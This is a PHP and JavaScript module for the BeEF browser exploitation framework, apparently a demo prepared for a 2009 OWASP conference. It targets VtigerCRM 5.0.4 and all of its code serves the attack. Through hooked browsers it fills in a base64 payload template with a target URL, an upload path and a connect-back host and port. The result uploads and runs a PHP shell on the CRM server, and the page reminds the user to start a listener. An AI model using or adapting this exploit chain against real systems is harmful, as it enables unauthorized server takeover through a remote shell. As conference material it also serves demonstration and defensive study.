<?
// VtigerCRM <= 5.0.4 "chained exploitation" PoC 
// Hacked up for OWASP New Zealand Day, July 13th 2009
//
// Thanks for the BeEF Wade :) 


	require_once("../../../include/common.inc.php"); // included for get_b64_file()

	DEFINE('JS_FILE', './template.js');

	// Where did our file end up?
	// Example /storage/2009/June/week3/<file>:

	$year = date("Y");
	$month = date("F");
	$weekNum = date("W") - date("W",strtotime(date("Y-m-01"))) + 1;
	$path = "/storage/$year/$month/week$weekNum/"

?>

<script>
	var rtnval = "vtiger exploit sent";

	function get_b64_code_vtiger() {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "ATTACKURL", document.myform.vtiger_url.value);
		b64code = b64replace(b64code, "FILEPATH", document.myform.vtiger_filepath.value);
		b64code = b64replace(b64code, "CONNECTHOST", document.myform.vtiger_host.value);
		b64code = b64replace(b64code, "CONNECTPORT", document.myform.vtiger_port.value);
		b64code = b64replace(b64code, "RTN", rtnval);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('vtiger arbatory upload', get_b64_code_vtiger());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_vtiger());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">vtiger CRM - File Upload / Execution Exploit</div>
<div class="entry">
	Upload and execute a PHP shell demo <a href="http://www.vtiger.com/">vtiger 5.0.4</a> exploit  (Don't forget to start the listener!) <br/><br/>
</div>
<div id="module_subsection">
	<form name="myform">
		<input type="text" name="vtiger_url" value="http://localhost/vtigercrm"/>
		<input type="text" name="vtiger_filepath" value="<?php echo $path;?>"/>
		<input type="text" name="vtiger_host" value="localhost"/>
		<input type="text" name="vtiger_port" value="8888"/>
		<input class="button" type="button" value=" set autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" send now " onClick="javascript:send_now()"/>
	</form>
</div>

